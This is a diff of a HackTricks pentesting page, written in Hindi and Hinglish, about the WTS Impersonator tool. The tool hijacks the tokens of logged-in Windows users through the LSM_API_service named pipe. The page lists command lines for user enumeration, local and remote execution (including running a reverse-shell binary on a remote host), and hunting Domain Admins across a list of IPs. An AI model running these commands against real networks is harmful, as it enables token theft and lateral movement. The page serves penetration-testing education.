@@ -1,48 +1,54 @@
+# WTS Impersonator
+
 {{#include ../../banners/hacktricks-training.md}}
 
-**WTS Impersonator** उपकरण **"\\pipe\LSM_API_service"** RPC Named pipe का उपयोग करके चुपचाप लॉग इन उपयोगकर्ताओं की सूची बनाता है और उनके टोकन को हाईजैक करता है, पारंपरिक Token Impersonation तकनीकों को बायपास करता है। यह दृष्टिकोण नेटवर्क के भीतर निर्बाध पार्श्व आंदोलनों को सुविधाजनक बनाता है। इस तकनीक के पीछे की नवाचार **Omri Baso** को श्रेय दिया जाता है, cuyo काम [GitHub](https://github.com/OmriBaso/WTSImpersonator) पर उपलब्ध है।
+**WTS Impersonator** tool **"\\pipe\LSM_API_service"** RPC Named pipe का उपयोग करके stealthily logged-in users की enumeration करता है और उनके tokens को hijack करता है, जिससे traditional Token Impersonation techniques को bypass किया जा सकता है। यह approach networks के भीतर seamless lateral movements को संभव बनाता है। इस technique का innovation **Omri Baso** को credit दिया जाता है, जिनका work [GitHub](https://github.com/OmriBaso/WTSImpersonator) पर उपलब्ध है।<sup>[[1]](#references)</sup>
 
 ### Core Functionality
 
-उपकरण API कॉल की एक श्रृंखला के माध्यम से कार्य करता है:
+Tool API calls के एक sequence के माध्यम से operate करता है:
 ```bash
 WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
 ```
-### Key Modules and Usage
+### प्रमुख Modules और Usage
 
-- **Enumerating Users**: स्थानीय और दूरस्थ उपयोगकर्ता सूचीकरण इस उपकरण के साथ संभव है, किसी भी परिदृश्य के लिए आदेशों का उपयोग करते हुए:
+- **Users Enumerating**: इस tool के साथ local और remote user enumeration संभव है, जिसमें दोनों scenarios के लिए commands का उपयोग किया जाता है:
 
 - Locally:
 ```bash
 .\WTSImpersonator.exe -m enum
 ```
-- Remotely, by specifying an IP address or hostname:
+- Remotely, IP address या hostname निर्दिष्ट करके:
 ```bash
 .\WTSImpersonator.exe -m enum -s 192.168.40.131
 ```
 
-- **Executing Commands**: `exec` और `exec-remote` मॉड्यूल को कार्य करने के लिए एक **Service** संदर्भ की आवश्यकता होती है। स्थानीय निष्पादन के लिए केवल WTSImpersonator निष्पादन योग्य और एक आदेश की आवश्यकता होती है:
+- **Commands Executing**: `exec` और `exec-remote` modules को काम करने के लिए **Service** context की आवश्यकता होती है। Local execution के लिए केवल WTSImpersonator executable और एक command की आवश्यकता होती है:
 
-- Example for local command execution:
+- Local command execution का example:
 ```bash
 .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
 ```
-- PsExec64.exe का उपयोग सेवा संदर्भ प्राप्त करने के लिए किया जा सकता है:
+- Service context प्राप्त करने के लिए PsExec64.exe का उपयोग किया जा सकता है:
 ```bash
 .\PsExec64.exe -accepteula -s cmd.exe
 ```
 
-- **Remote Command Execution**: इसमें PsExec.exe के समान दूरस्थ रूप से एक सेवा बनाना और स्थापित करना शामिल है, जो उचित अनुमतियों के साथ निष्पादन की अनुमति देता है।
+- **Remote Command Execution**: इसमें PsExec.exe के समान remotely एक service create और install करना शामिल है, जिससे appropriate permissions के साथ execution किया जा सके।
 
-- Example of remote execution:
+- Remote execution का example:
 ```bash
 .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
 ```
 
-- **User Hunting Module**: कई मशीनों में विशिष्ट उपयोगकर्ताओं को लक्षित करता है, उनके क्रेडेंशियल के तहत कोड निष्पादित करता है। यह विशेष रूप से कई सिस्टम पर स्थानीय प्रशासनिक अधिकारों के साथ डोमेन प्रशासकों को लक्षित करने के लिए उपयोगी है।
+- **User Hunting Module**: यह multiple machines पर specific users को target करता है और उनके credentials के under code execute करता है। यह विशेष रूप से उन Domain Admins को target करने के लिए उपयोगी है जिनके पास कई systems पर local admin rights हैं।
 - Usage example:
 ```bash
 .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
 ```
+
+## References
+
+- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)
 
 {{#include ../../banners/hacktricks-training.md}}
